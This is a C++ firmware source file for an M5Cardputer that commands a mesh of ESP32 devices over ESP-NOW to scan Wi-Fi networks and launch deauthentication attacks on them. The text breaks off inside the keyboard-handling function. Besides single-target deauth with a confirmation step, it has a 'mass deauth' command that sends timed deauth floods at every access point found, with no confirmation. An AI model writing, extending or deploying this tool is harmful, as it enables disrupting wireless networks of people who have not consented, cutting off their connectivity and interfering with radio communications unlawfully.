#include <M5Cardputer.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_now.h>
#include <ArduinoJson.h>
#include <vector>
#include <map>
#include <algorithm> // For std::count_if

// =============================================================================
// CONFIGURATION AND CONSTANTS
// =============================================================================
#define MAX_SLAVES 15
#define SCAN_TIMEOUT_MS 15000
#define DEAUTH_DURATION_MS 30000
#define MESH_CHANNEL 1
#define JSON_BUFFER_SIZE 2048 // Increased buffer size for more complex JSON
#define HEARTBEAT_INTERVAL 5000
#define SLAVE_TIMEOUT 15000

// Display constants
#define SCREEN_WIDTH 240
#define SCREEN_HEIGHT 135
#define BORDER_WIDTH 2
#define HEADER_HEIGHT 20
#define FOOTER_HEIGHT 25
#define LINE_HEIGHT 10
#define CHAR_WIDTH 6 // Assuming 6 pixels per character for default font

// Colors
#define COLOR_BORDER 0x39C4 // Blue-ish
#define COLOR_HEADER 0x07FF // Cyan
#define COLOR_SUCCESS 0x07E0 // Green
#define COLOR_WARNING 0xFFE0 // Yellow
#define COLOR_ERROR 0xF800 // Red
#define COLOR_TEXT 0xFFFF // White
#define COLOR_SELECTED 0x07FF // Cyan for selected item
#define COLOR_BG 0x0000 // Black background

// Command definitions
enum Command {
  CMD_NONE,
  CMD_SCAN,
  CMD_SELECT, // Selects an AP by number
  CMD_DEAUTH,
  CMD_STOP,   // Stops all active deauths
  CMD_STATUS, // Shows master's status (not explicitly used as a command, more for internal state)
  CMD_CLEAR,  // Clears AP list and deauth targets
  CMD_HELP,
  CMD_TOGGLE_VIEW, // Internal command for switching display modes
  CMD_CONFIRM_DEAUTH, // New command for deauth confirmation
  CMD_MASS_SCAN, // Mass scan all slaves
  CMD_MASS_DEAUTH // Mass deauth all visible networks
};

// Message types for ESP-NOW communication
enum MessageType {
  MSG_SLAVE_REGISTER,
  MSG_SCAN_REQUEST,
  MSG_SCAN_RESPONSE,
  MSG_DEAUTH_REQUEST,
  MSG_DEAUTH_RESPONSE,
  MSG_STATUS_REQUEST, // For requesting slave status (currently integrated into heartbeat)
  MSG_STATUS_RESPONSE,
  MSG_HEARTBEAT,
  MSG_STATISTICS, // For future aggregated stats from slaves
  MSG_ERROR
};

// =============================================================================
// DATA STRUCTURES
// =============================================================================
struct SlaveDevice {
  uint8_t mac[6];
  String macStr;
  bool connected;
  bool supports5GHz;
  bool supportsBLE;
  unsigned long lastHeartbeat;
  String deviceType;
  int32_t rssi;
  uint8_t batteryLevel;
  uint32_t freeHeap;
  uint32_t uptime;
  uint16_t packetsProcessed;
  float temperature;
  String firmwareVersion;
};

struct AccessPoint {
  String ssid;
  String bssid;
  int32_t rssi;
  uint32_t channel;
  bool isHidden;
  bool is5GHz;
  uint8_t encryption;
  uint8_t slaveMac[6];
  String slaveId; // Last 4 digits of slave MAC or "MASTER"
  unsigned long lastSeen;
  uint16_t beaconInterval;
  String vendor;
};

struct DeauthTarget {
  String bssid;
  String ssid;
  uint32_t channel;
  bool active;
  unsigned long startTime;
  uint32_t packetsSent;
  uint8_t slaveMac[6];
  bool success;
};

struct ESPNowMessage {
  MessageType type;
  uint8_t slaveMac[6]; // MAC of the sender (slave) or target (master)
  uint32_t messageId;
  uint32_t timestamp;
  char payload[180]; // Max payload size for ESP-NOW is around 250 bytes, leaving space for header
};

struct Statistics {
  uint32_t totalPacketsReceived;
  uint32_t totalPacketsSent;
  uint32_t scanCount;
  uint32_t networksFound;
  uint32_t uniqueNetworks; // Networks found during a scan
  unsigned long uptime;
  uint32_t meshErrors;
  float avgSlaveRSSI; // Placeholder for future aggregation
  uint32_t deauthCount; // Total deauth operations initiated
};

// =============================================================================
// GLOBAL VARIABLES
// =============================================================================
std::vector<SlaveDevice> slaves;
std::vector<AccessPoint> accessPoints;
std::vector<DeauthTarget> deauthTargets;
std::map<String, int> apIndex; // Maps BSSID string to index in accessPoints vector

String currentCommand = "";
String terminalBuffer = ""; // Stores characters typed by the user

String statusMessage = "System Ready";
int selectedAP = -1; // Index of the currently selected Access Point
bool deauthConfirmationPending = false; // New flag for deauth confirmation

bool scanInProgress = false;
bool deauthInProgress = false;

unsigned long lastStatusUpdate = 0;
unsigned long scanStartTime = 0;
unsigned long lastHeartbeatSent = 0;

uint32_t messageCounter = 0; // Incremented for each outgoing ESP-NOW message

// Display variables
int displayOffset = 0; // Scroll offset for AP/Slave lists
int maxDisplayLines = 7; // Calculated dynamically based on screen size, initial value
int displayMode = 0; // 0=APs, 1=Slaves, 2=Stats

Statistics stats = {0, 0, 0, 0, 0, 0, 0, 0}; // Initialize all stats to 0

// =============================================================================
// FUNCTION PROTOTYPES (forward declarations)
// =============================================================================
// Utility
String macToString(const uint8_t* mac);
void stringToMac(const String& macStr, uint8_t* mac);
String formatUptime(uint32_t milliseconds);
String getEncryptionType(uint8_t encType);

// Forward declarations for message handlers
void handleSlaveRegistration(const ESPNowMessage& message);
void handleHeartbeat(const ESPNowMessage& message);
void handleScanResponse(const ESPNowMessage& message);
void handleDeauthResponse(const ESPNowMessage& message);
void handleStatusResponse(const ESPNowMessage& message);
void handleStatistics(const ESPNowMessage& message);
void handleError(const ESPNowMessage& message);

// Added debug counters for testing
uint32_t debugEspNowInitAttempts = 0;
uint32_t debugPeersAdded = 0;
uint32_t debugMessagesSent = 0;
uint32_t debugMessagesReceived = 0;
uint32_t debugCommandProcessed = 0;
uint32_t debugScanStarted = 0;
uint32_t debugScanCompleted = 0;
uint32_t debugDeauthStarted = 0;
uint32_t debugDeauthCompleted = 0;

// ESP-NOW callback for data sent
void updateDisplay(); // Forward declaration

void onESPNowDataSent(const uint8_t *mac_addr, esp_now_send_status_t status) {
  debugMessagesSent++;
  if (status == ESP_NOW_SEND_SUCCESS) {
    stats.totalPacketsSent++;
    statusMessage = "ESP-NOW send success";
  } else {
    stats.meshErrors++;
    statusMessage = "ESP-NOW send failed";
  }
  updateDisplay();
}

// Message Handlers
void handleSlaveRegistration(const ESPNowMessage& message);
void handleHeartbeat(const ESPNowMessage& message);
void handleScanResponse(const ESPNowMessage& message);
void handleDeauthResponse(const ESPNowMessage& message);
void handleStatusResponse(const ESPNowMessage& message); // Currently merged with heartbeat
void handleStatistics(const ESPNowMessage& message); // For future use
void handleError(const ESPNowMessage& message);

// Slave Management
void checkSlaveConnections();
int getConnectedSlaveCount();
void sendHeartbeat();

// WiFi Scanning
void startWiFiScan(bool both_bands = true, bool include_hidden = true); // Added arguments for scan filtering
void checkScanProgress();

// Deauthentication
void startDeauth(int apIndex);
void checkDeauthProgress();

// Command Processing
Command parseCommand(const String& cmd);
void processCommand(const String& cmd);
void handleKeyboardInput();

// Display Functions
void drawBorder();
void drawHeader();
void drawAccessPoints();
void drawSlaves();
void drawStatistics();
void drawFooter();
void clearScreen();
void updateDisplay();

// =============================================================================
// UTILITY FUNCTIONS
// =============================================================================
String macToString(const uint8_t* mac) {
  char buffer[18];
  sprintf(buffer, "%02X:%02X:%02X:%02X:%02X:%02X",
          mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buffer);
}

void stringToMac(const String& macStr, uint8_t* mac) {
  uint32_t mac_part[6]; // Use uint32_t for sscanf to avoid issues with %hhx on some platforms
  sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
         &mac_part[0], &mac_part[1], &mac_part[2], &mac_part[3], &mac_part[4], &mac_part[5]);
  for(int i=0; i<6; ++i) {
    mac[i] = (uint8_t)mac_part[i];
  }
}

String formatUptime(uint32_t milliseconds) {
  uint32_t seconds = milliseconds / 1000;
  uint32_t minutes = seconds / 60;
  uint32_t hours = minutes / 60;
  uint32_t days = hours / 24;

  String uptimeStr = "";
  if (days > 0) {
    uptimeStr += String(days) + "d ";
  }
  if (hours > 0) {
    uptimeStr += String(hours % 24) + "h ";
  }
  uptimeStr += String(minutes % 60) + "m ";
  uptimeStr += String(seconds % 60) + "s";
  return uptimeStr;
}

String getEncryptionType(uint8_t encType) {
  switch (encType) {
    case WIFI_AUTH_OPEN:           return "OPEN";
    case WIFI_AUTH_WEP:            return "WEP";
    case WIFI_AUTH_WPA_PSK:        return "WPA";
    case WIFI_AUTH_WPA2_PSK:       return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK:   return "WPA/2";
    case WIFI_AUTH_WPA2_ENTERPRISE:return "WPA2-E";
    case WIFI_AUTH_WPA3_PSK:       return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK:  return "WPA2/3";
    default:                       return "UNK"; // Unknown or other types
  }
}

// =============================================================================
// ESP-NOW COMMUNICATION FUNCTIONS
// =============================================================================
void onESPNowDataReceived(const esp_now_recv_info_t *recv_info, const uint8_t *incomingData, int len) {
  // Check if the received data length matches our expected message structure
  if (len != sizeof(ESPNowMessage)) {
    stats.meshErrors++;
    return;
  }

  ESPNowMessage message;
  // Copy the incoming data into our message structure
  memcpy(&message, incomingData, sizeof(message));
  stats.totalPacketsReceived++;

  // Use recv_info->src_addr instead of separate mac parameter
  const uint8_t *mac = recv_info->src_addr;

  // Handle message based on its type
  switch (message.type) {
    case MSG_SLAVE_REGISTER:
      handleSlaveRegistration(message);
      break;
    case MSG_SCAN_RESPONSE:
      handleScanResponse(message);
      break;
    case MSG_DEAUTH_RESPONSE:
      handleDeauthResponse(message);
      break;
    case MSG_STATUS_RESPONSE: // Handled by heartbeat currently
      handleStatusResponse(message);
      break;
    case MSG_HEARTBEAT:
      handleHeartbeat(message);
      break;
    case MSG_STATISTICS:
      handleStatistics(message);
      break;
    case MSG_ERROR:
      handleError(message);
      break;
    default:
      stats.meshErrors++; // Unrecognized message type
      break;
  }
}

void sendMessageToSlave(const uint8_t* slaveMac, MessageType type, const String& payload = "") {
  ESPNowMessage message;
  message.type = type;
  memcpy(message.slaveMac, slaveMac, 6);
  message.messageId = messageCounter++;
  message.timestamp = millis();
  
  // Copy payload, ensuring null termination
  strncpy(message.payload, payload.c_str(), sizeof(message.payload) - 1);
  message.payload[sizeof(message.payload) - 1] = '\0';
  
  esp_err_t result = esp_now_send(slaveMac, (uint8_t*)&message, sizeof(message));
  if (result != ESP_OK) {
    stats.meshErrors++;
    statusMessage = "ESP-NOW send failed: " + String(result);
  }
}

void broadcastToSlaves(MessageType type, const String& payload = "") {
  // ESP-NOW doesn't support true broadcast, so send to all known slaves
  for (const auto& slave : slaves) {
    if (slave.connected) {
      sendMessageToSlave(slave.mac, type, payload);
    }
  }
}

// =============================================================================
// MESSAGE HANDLERS
// =============================================================================
void handleSlaveRegistration(const ESPNowMessage& message) {
  // Deserialize the JSON payload from the slave
  DynamicJsonDocument doc(JSON_BUFFER_SIZE);
  DeserializationError error = deserializeJson(doc, message.payload);

  if (error) {
    statusMessage = "JSON error (Reg): " + String(error.c_str());
    stats.meshErrors++;
    return;
  }

  String macStr = macToString(message.slaveMac);

  // Add slave as ESP-NOW peer if not already added
  esp_now_peer_info_t peerInfo = {};
  peerInfo.channel = MESH_CHANNEL;
  peerInfo.encrypt = false;
  memcpy(peerInfo.peer_addr, message.slaveMac, 6);
  
  if (!esp_now_is_peer_exist(message.slaveMac)) {
    esp_err_t result = esp_now_add_peer(&peerInfo);
    if (result != ESP_OK) {
      statusMessage = "Failed to add peer: " + macStr.substring(12);
      return;
    }
  }

  // Check if slave already exists by comparing MAC address
  for (auto& slave : slaves) {
    if (memcmp(slave.mac, message.slaveMac, 6) == 0) {
      // Slave reconnected or updated info
      slave.connected = true;
      slave.lastHeartbeat = millis();
      // Update slave capabilities and info
      slave.supports5GHz = doc["supports5GHz"];
      slave.supportsBLE = doc["supportsBLE"];
      slave.deviceType = doc["deviceType"].as<String>();
      slave.firmwareVersion = doc["firmwareVersion"].as<String>();
      slave.batteryLevel = doc["batteryLevel"];
      slave.freeHeap = doc["freeHeap"];
      slave.temperature = doc["temperature"];
      statusMessage = "Slave reconnected: " + macStr.substring(12); // Show last 6 digits of MAC
      return;
    }
  }

  // If slave does not exist, add it to the list
  SlaveDevice newSlave;
  memcpy(newSlave.mac, message.slaveMac, 6);
  newSlave.macStr = macStr;
  newSlave.connected = true;
  newSlave.lastHeartbeat = millis();
  newSlave.supports5GHz = doc["supports5GHz"];
  newSlave.supportsBLE = doc["supportsBLE"];
  newSlave.deviceType = doc["deviceType"].as<String>();
  newSlave.firmwareVersion = doc["firmwareVersion"].as<String>();
  newSlave.batteryLevel = doc["batteryLevel"];
  newSlave.freeHeap = doc["freeHeap"];
  newSlave.temperature = doc["temperature"];
  newSlave.uptime = 0; // Will be updated by heartbeats
  newSlave.packetsProcessed = 0; // Will be updated by heartbeats
  newSlave.rssi = 0; // Initial RSSI, updated by heartbeats

  slaves.push_back(newSlave);
  statusMessage = "New slave connected: " + macStr.substring(12);
}

void handleHeartbeat(const ESPNowMessage& message) {
  DynamicJsonDocument doc(JSON_BUFFER_SIZE);
  DeserializationError error = deserializeJson(doc, message.payload);

  if (error) {
    statusMessage = "JSON error (HB): " + String(error.c_str());
    stats.meshErrors++;
    return;
  }

  // Find the slave and update its details
  for (auto& slave : slaves) {
    if (memcmp(slave.mac, message.slaveMac, 6) == 0) {
      slave.lastHeartbeat = millis();
      slave.connected = true;
      slave.rssi = doc["rssi"];
      slave.batteryLevel = doc["batteryLevel"];
      slave.freeHeap = doc["freeHeap"];
      slave.uptime = doc["uptime"];
      slave.packetsProcessed = doc["packetsProcessed"];
      slave.temperature = doc["temperature"];
      break;
    }
  }
}

void handleScanResponse(const ESPNowMessage& message) {
  DynamicJsonDocument doc(JSON_BUFFER_SIZE);
  DeserializationError error = deserializeJson(doc, message.payload);

  if (error) {
    statusMessage = "JSON error (Scan): " + String(error.c_str());
    stats.meshErrors++;
    return;
  }

  String slaveId = macToString(message.slaveMac).substring(12); // Last 6 digits of slave MAC
  JsonArray networks = doc["networks"]; // Array of networks found by the slave

  for (JsonVariant network : networks) {
    AccessPoint ap;
    ap.ssid = network["ssid"].as<String>();
    ap.bssid = network["bssid"].as<String>();
    ap.rssi = network["rssi"];
    ap.channel = network["channel"];
    ap.isHidden = network["hidden"];
    ap.is5GHz = network["is5GHz"];
    ap.encryption = network["encryption"];
    ap.beaconInterval = network["beaconInterval"];
    ap.vendor = network["vendor"].as<String>();
    memcpy(ap.slaveMac, message.slaveMac, 6);
    ap.slaveId = slaveId;
    ap.lastSeen = millis();

    // Check for duplicates using BSSID as key
    String key = ap.bssid;
    if (apIndex.find(key) == apIndex.end()) {
      // New AP, add to list and map
      apIndex[key] = accessPoints.size();
      accessPoints.push_back(ap);
      stats.networksFound++; // Increment total networks found
    } else {
      // Existing AP, update with potentially stronger signal or newer data
      int idx = apIndex[key];
      if (ap.rssi > accessPoints[idx].rssi) { // Update if RSSI is better
        accessPoints[idx] = ap;
      }
    }
  }
}

void handleDeauthResponse(const ESPNowMessage& message) {
  DynamicJsonDocument doc(JSON_BUFFER_SIZE);
  DeserializationError error = deserializeJson(doc, message.payload);

  if (error) {
    statusMessage = "JSON error (Deauth): " + String(error.c_str());
    stats.meshErrors++;
    return;
  }

  String bssid = doc["bssid"].as<String>();
  bool success = doc["success"];
  uint32_t packetsCount = doc["packets"];

  // Find the corresponding deauth target and update its status
  for (auto& target : deauthTargets) {
    if (target.bssid == bssid && memcmp(target.slaveMac, message.slaveMac, 6) == 0) {
      target.success = success;
      target.packetsSent = packetsCount;
      // Mark as inactive if successful or duration passed
      if (!success || millis() - target.startTime > DEAUTH_DURATION_MS) {
        target.active = false;
        statusMessage = success ? "Deauth completed: " + bssid.substring(12) :
                                  "Deauth failed: " + bssid.substring(12);
      }
      break;
    }
  }
}

void handleStatusResponse(const ESPNowMessage& message) {
  // Status updates are integrated into heartbeat messages for simplicity and efficiency.
  // This function can be expanded if a specific "status request" and response
  // mechanism is implemented separately from heartbeats.
  // For now, this is a placeholder.
}

void handleStatistics(const ESPNowMessage& message) {
  // This function is a placeholder for aggregating statistics from multiple slaves
  // if they were to send their own statistics messages.
  // Currently, master collects its own stats and receives slave-specific data via heartbeats.
}

void handleError(const ESPNowMessage& message) {
  DynamicJsonDocument doc(JSON_BUFFER_SIZE);
  DeserializationError error = deserializeJson(doc, message.payload);

  if (error) {
    statusMessage = "JSON error (Err): " + String(error.c_str());
    stats.meshErrors++;
    return;
  }

  String errorMsg = doc["error"].as<String>();
  String slaveId = macToString(message.slaveMac).substring(12);
  statusMessage = "Error from " + slaveId + ": " + errorMsg;
  stats.meshErrors++;
}

// =============================================================================
// SLAVE MANAGEMENT
// =============================================================================
void checkSlaveConnections() {
  unsigned long currentTime = millis();
  int disconnected = 0;

  // Iterate through slaves and mark as disconnected if heartbeat timeout
  for (auto it = slaves.begin(); it != slaves.end(); ) {
    if (it->connected && (currentTime - it->lastHeartbeat > SLAVE_TIMEOUT)) {
      // Remove peer from ESP-NOW
      if (esp_now_is_peer_exist(it->mac)) {
        esp_err_t res = esp_now_del_peer(it->mac);
        if (res == ESP_OK) {
          statusMessage = "Removed peer: " + it->macStr.substring(12);
        } else {
          statusMessage = "Failed to remove peer: " + it->macStr.substring(12);
        }
      }
      it = slaves.erase(it);
      disconnected++;
    } else {
      ++it;
    }
  }

  if (disconnected > 0) {
    statusMessage = String(disconnected) + " slave(s) disconnected and removed.";
  }
}

int getConnectedSlaveCount() {
  int count = 0;
  for (const auto& slave : slaves) {
    if (slave.connected) count++;
  }
  return count;
}

void sendHeartbeat() {
  // Send heartbeat messages to all connected slaves periodically
  if (millis() - lastHeartbeatSent > HEARTBEAT_INTERVAL) {
    DynamicJsonDocument doc(JSON_BUFFER_SIZE);
    doc["uptime"] = millis();
    doc["freeHeap"] = ESP.getFreeHeap();
    doc["packetsReceived"] = stats.totalPacketsReceived;
    doc["packetsSent"] = stats.totalPacketsSent;

    String payload;
    serializeJson(doc, payload);

    broadcastToSlaves(MSG_HEARTBEAT, payload);
    lastHeartbeatSent = millis();
  }
}

// =============================================================================
// WIFI SCANNING
// =============================================================================
void startWiFiScan(bool both_bands /* = true */, bool include_hidden /* = true */) {
  if (scanInProgress) {
    statusMessage = "Scan already in progress!";
    return;
  }

  accessPoints.clear(); // Clear previous scan results
  apIndex.clear();
  selectedAP = -1; // Deselect any previously selected AP
  displayOffset = 0; // Reset scroll offset

  scanInProgress = true;
  scanStartTime = millis();
  stats.scanCount++; // Increment master's scan count

  statusMessage = "Starting WiFi scan...";

  // Request scan from all connected slaves with specified filters
  DynamicJsonDocument doc(JSON_BUFFER_SIZE);
  doc["both_bands"] = both_bands;
  doc["include_hidden"] = include_hidden;
  doc["passive_scan"] = false;    // Active scan (sends probe requests)
  doc["scan_time"] = 3000;        // Suggested scan duration for slaves

  String payload;
  serializeJson(doc, payload);

  broadcastToSlaves(MSG_SCAN_REQUEST, payload);

  // Also perform a local scan on the Cardputer itself
  // Note: local WiFi.scanNetworks doesn't have direct 'both_bands' or 'passive_scan' arguments
  // 'true' for async, 'include_hidden' for hidden networks. Band selection is implicit.
  WiFi.scanNetworks(true, include_hidden);
}

void checkScanProgress() {
  if (!scanInProgress) return;

  // Check local scan progress
  int localScanResult = WiFi.scanComplete();
  if (localScanResult >= 0) { // Scan is complete (result >= 0)
    for (int i = 0; i < localScanResult; i++) {
      AccessPoint ap;
      ap.ssid = WiFi.SSID(i);
      ap.bssid = WiFi.BSSIDstr(i);
      ap.rssi = WiFi.RSSI(i);
      ap.channel = WiFi.channel(i);
      ap.isHidden = (ap.ssid.length() == 0);
      ap.is5GHz = (ap.channel > 14); // Channels > 14 are generally 5GHz
      ap.encryption = WiFi.encryptionType(i);
      memset(ap.slaveMac, 0, 6); // Mark as master-scanned
      ap.slaveId = "MASTER";
      ap.lastSeen = millis();
      ap.beaconInterval = 0; // Not available from WiFi.scanNetworks
      ap.vendor = "Unknown"; // Not available from WiFi.scanNetworks

      // Apply filter for local scan results as well, if specific band was requested
      // The startWiFiScan function's arguments control what's requested from slaves,
      // but the master's own scan needs to be filtered manually.
      bool filter_5g = false;
      bool filter_2g = false;
      if (currentCommand.startsWith("scan 5g")) {
          filter_5g = true;
      } else if (currentCommand.startsWith("scan 2g")) {
          filter_2g = true;
      }

      if ((filter_5g && !ap.is5GHz) || (filter_2g && ap.is5GHz)) {
          continue; // Skip this AP if it doesn't match the band filter
      }

      String key = ap.bssid;
      if (apIndex.find(key) == apIndex.end()) {
        apIndex[key] = accessPoints.size();
        accessPoints.push_back(ap);
        stats.networksFound++;
      } else {
        // Update with stronger signal if local scan finds it better
        int idx = apIndex[key];
        if (ap.rssi > accessPoints[idx].rssi) {
          accessPoints[idx] = ap;
        }
      }
    }
    WiFi.scanDelete(); // Clear scan results from WiFi library
  }

  // Check for scan timeout (master and slaves combined)
  if (millis() - scanStartTime > SCAN_TIMEOUT_MS) {
    scanInProgress = false;
    stats.uniqueNetworks = accessPoints.size();
    statusMessage = "Scan complete: " + String(accessPoints.size()) + " networks found.";
  }
}

// =============================================================================
// DEAUTHENTICATION
// =============================================================================
void startDeauth(int apIndex) {
  if (apIndex < 0 || apIndex >= accessPoints.size()) {
    statusMessage = "Invalid AP selection.";
    deauthConfirmationPending = false; // Reset confirmation
    return;
  }

  AccessPoint& ap = accessPoints[apIndex];

  // Check if already deauthing this target by the same slave
  for (auto& existing : deauthTargets) {
    if (existing.bssid == ap.bssid && memcmp(existing.slaveMac, ap.slaveMac, 6) == 0 && existing.active) {
      statusMessage = "Already deauthing: " + ap.bssid.substring(12);
      deauthConfirmationPending = false; // Reset confirmation
      return;
    }
  }

  // Deauth can only be initiated by a slave for now
  if (memcmp(ap.slaveMac, "\x00\x00\x00\x00\x00\x00", 6) == 0 || strcmp(ap.slaveId.c_str(), "MASTER") == 0) {
    statusMessage = "Deauth not supported directly on master. Select an AP found by a slave.";
    deauthConfirmationPending = false; // Reset confirmation
    return;
  }

  // Proceed with deauth, create new target
  DeauthTarget target;
  target.bssid = ap.bssid;
  target.ssid = ap.ssid.length() > 0 ? ap.ssid : "[Hidden]";
  target.channel = ap.channel;
  target.active = true;
  target.startTime = millis();
  target.packetsSent = 0;
  memcpy(target.slaveMac, ap.slaveMac, 6); // Use the slave that reported this AP
  target.success = false;

  deauthTargets.push_back(target);

  // Prepare JSON payload for deauth request
  DynamicJsonDocument doc(JSON_BUFFER_SIZE);
  doc["bssid"] = ap.bssid;
  doc["channel"] = ap.channel;
  doc["duration"] = DEAUTH_DURATION_MS;
  doc["packets_per_second"] = 10; // Adjustable rate

  String payload;
  serializeJson(doc, payload);

  sendMessageToSlave(ap.slaveMac, MSG_DEAUTH_REQUEST, payload);
  statusMessage = "Starting deauth for: " + target.ssid;
  stats.deauthCount++;
  deauthInProgress = true; // Set global flag
  deauthConfirmationPending = false; // Reset confirmation
}

void checkDeauthProgress() {
  bool anyActive = false;
  unsigned long currentTime = millis();

  // Check status of all active deauth targets
  for (auto& target : deauthTargets) {
    if (target.active) {
      if (currentTime - target.startTime > DEAUTH_DURATION_MS) {
        // Deauth duration expired, mark as inactive
        target.active = false;
        if (!target.success) { // If it wasn't already marked successful
             statusMessage = "Deauth timed out for: " + target.ssid;
        }
      } else {
        anyActive = true; // Still an active deauth operation
      }
    }
  }

  deauthInProgress = anyActive; // Update global flag
}

// =============================================================================
// COMMAND PROCESSING
// =============================================================================
Command parseCommand(const String& cmd) {
  String lowerCmd = cmd;
  lowerCmd.toLowerCase();
  lowerCmd.trim();

  // Handle multi-word commands first
  if (lowerCmd.startsWith("scan")) return CMD_SCAN;
  if (lowerCmd == "confirm deauth") return CMD_CONFIRM_DEAUTH;
  if (lowerCmd == "mass scan") return CMD_MASS_SCAN;
  if (lowerCmd == "mass deauth") return CMD_MASS_DEAUTH;

  // Map single-word commands to enum values
  if (lowerCmd == "select") return CMD_SELECT;
  if (lowerCmd == "deauth") return CMD_DEAUTH;
  if (lowerCmd == "stop") return CMD_STOP;
  if (lowerCmd == "status") return CMD_STATUS;
  if (lowerCmd == "clear") return CMD_CLEAR;
  if (lowerCmd == "help") return CMD_HELP;
  if (lowerCmd == "view") return CMD_TOGGLE_VIEW;

  return CMD_NONE;
}

void processCommand(const String& cmd) {
  Command command = parseCommand(cmd);
  String lowerCmd = cmd;
  lowerCmd.toLowerCase();
  lowerCmd.trim();
  std::map<String, std::vector<AccessPoint*>> slaveAPs; // Moved outside switch and initialized here

  // If a deauth confirmation is pending, only accept "confirm deauth"
  if (deauthConfirmationPending) {
      if (command == CMD_CONFIRM_DEAUTH) {
          startDeauth(selectedAP); // Proceed with deauth
      } else {
          statusMessage = "Deauth cancelled. Command ignored.";
          deauthConfirmationPending = false; // Cancel confirmation
      }
      return; // Exit after handling confirmation
  }


  switch (command) {
    case CMD_SCAN: {
      bool both_bands = true;
      bool include_hidden = true;
      if (lowerCmd == "scan 5g") {
        both_bands = false; // Only 5GHz
        statusMessage = "Starting 5GHz scan...";
      } else if (lowerCmd == "scan 2g") {
        both_bands = false; // Only 2.4GHz
        statusMessage = "Starting 2.4GHz scan...";
      } else if (lowerCmd == "scan hidden") {
        include_hidden = true; // Explicitly include hidden (already default)
        statusMessage = "Starting scan (including hidden)...";
      } else if (lowerCmd == "scan all" || lowerCmd == "scan") {
        // Default behavior
        statusMessage = "Starting full scan...";
      } else {
          statusMessage = "Invalid scan command. Use 'scan', 'scan 5g', 'scan 2g', or 'scan hidden'.";
          break; // Don't start scan
      }
      startWiFiScan(both_bands, include_hidden);
      break;
    }

    case CMD_DEAUTH:
      // Initiate deauth confirmation process
      if (selectedAP >= 0 && selectedAP < accessPoints.size()) {
        if (memcmp(accessPoints[selectedAP].slaveMac, "\x00\x00\x00\x00\x00\x00", 6) == 0 || strcmp(accessPoints[selectedAP].slaveId.c_str(), "MASTER") == 0) {
            statusMessage = "Deauth not supported directly on master. Select an AP found by a slave.";
        } else {
            statusMessage = "Deauth for " + (accessPoints[selectedAP].ssid.length() > 0 ? accessPoints[selectedAP].ssid : "[Hidden]") + ". Type 'confirm deauth' to proceed.";
            deauthConfirmationPending = true;
        }
      } else {
        statusMessage = "No AP selected. Use number to select an AP or 'help'.";
      }
      break;

    case CMD_STOP:
      // Stop all active deauth operations on slaves
      for (auto& target : deauthTargets) {
        if (target.active) {
          // A dedicated "STOP_DEAUTH" message type could be added for slaves to explicitly stop.
          // For simplicity, we just mark it inactive here on the master.
        }
        target.active = false; // Mark as inactive locally
      }
      deauthInProgress = false;
      deauthConfirmationPending = false; // Ensure confirmation is cancelled
      statusMessage = "All deauth operations stopped.";
      break;

    case CMD_CLEAR:
      // Clear all scanned APs and deauth targets
      accessPoints.clear();
      apIndex.clear();
      deauthTargets.clear();
      selectedAP = -1;
      displayOffset = 0;
      deauthConfirmationPending = false; // Ensure confirmation is cancelled
      statusMessage = "Display data cleared.";
      break;

    case CMD_HELP:
      statusMessage = "Commands: scan [5g/2g/hidden/all], mass scan, mass deauth, [num], deauth, stop, clear, view, help. Type 'confirm deauth' to proceed.";
      break;

    case CMD_MASS_SCAN:
      // Start a scan on all bands with all slaves
      startWiFiScan(true, true);
      break;

    case CMD_MASS_DEAUTH:
      // Start deauth on all discovered networks
      if (accessPoints.empty()) {
        statusMessage = "No networks found. Run 'scan' or 'mass scan' first.";
        break;
      }
      
      // Group APs by slave for efficient deauth
      slaveAPs.clear(); // Reuse the existing map
      for (auto& ap : accessPoints) {
        if (memcmp(ap.slaveMac, "\x00\x00\x00\x00\x00\x00", 6) != 0 && 
            strcmp(ap.slaveId.c_str(), "MASTER") != 0) {
          slaveAPs[ap.slaveId].push_back(&ap);
        }
      }

      // Send deauth requests to each slave for their APs
      for (const auto& pair : slaveAPs) {
        for (const auto* ap : pair.second) {
          DeauthTarget target;
          target.bssid = ap->bssid;
          target.ssid = ap->ssid.length() > 0 ? ap->ssid : "[Hidden]";
          target.channel = ap->channel;
          target.active = true;
          target.startTime = millis();
          target.packetsSent = 0;
          memcpy(target.slaveMac, ap->slaveMac, 6);
          target.success = false;

          deauthTargets.push_back(target);

          // Prepare JSON payload for deauth request
          DynamicJsonDocument doc(JSON_BUFFER_SIZE);
          doc["bssid"] = ap->bssid;
          doc["channel"] = ap->channel;
          doc["duration"] = DEAUTH_DURATION_MS;
          doc["packets_per_second"] = 10;

          String payload;
          serializeJson(doc, payload);

          sendMessageToSlave(ap->slaveMac, MSG_DEAUTH_REQUEST, payload);
          stats.deauthCount++;
        }
      }

      if (deauthTargets.empty()) {
        statusMessage = "No suitable networks found for deauth. Run scan first.";
      } else {
        deauthInProgress = true;
        statusMessage = "Mass deauth started on " + String(deauthTargets.size()) + " networks";
      }
      break;

    case CMD_STATUS:
      // Status message is always displayed in footer, no specific action needed
      statusMessage = "Current Status: " + statusMessage; // Re-display current status
      break;

    case CMD_TOGGLE_VIEW:
      displayMode = (displayMode + 1) % 3; // Cycle through 0=APs, 1=Slaves, 2=Stats
      displayOffset = 0; // Reset scroll on view change
      statusMessage = "Switched view to ";
      statusMessage += (displayMode == 0 ? "APs" : (displayMode == 1 ? "Slaves" : "Stats"));
      break;

    case CMD_CONFIRM_DEAUTH:
      // This case is handled at the beginning of processCommand if deauthConfirmationPending is true
      // If it reaches here, it means it was typed when not expected.
      statusMessage = "No deauth pending confirmation or invalid command.";
      deauthConfirmationPending = false;
      break;

    case CMD_SELECT:
        statusMessage = "Use '[number]' to select an AP."; // Informational
        break;

    case CMD_NONE:
    default:
      // Try to parse as number for AP selection if it's not a known command
      if (cmd.length() > 0) {
        int num = cmd.toInt();
        if (num > 0 && num <= accessPoints.size()) {
          selectedAP = num - 1; // Adjust to 0-based index
          statusMessage = "Selected: " + (accessPoints[selectedAP].ssid.length() > 0 ?
                                           accessPoints[selectedAP].ssid : "[Hidden]") + " by " + accessPoints[selectedAP].slaveId;
        } else {
          statusMessage = "Unknown command or invalid selection: " + cmd;
        }
      }
      break;
  }
}

void handleKeyboardInput() {
  // Updated keyboard handling for M5Cardputer
  char key = 0;
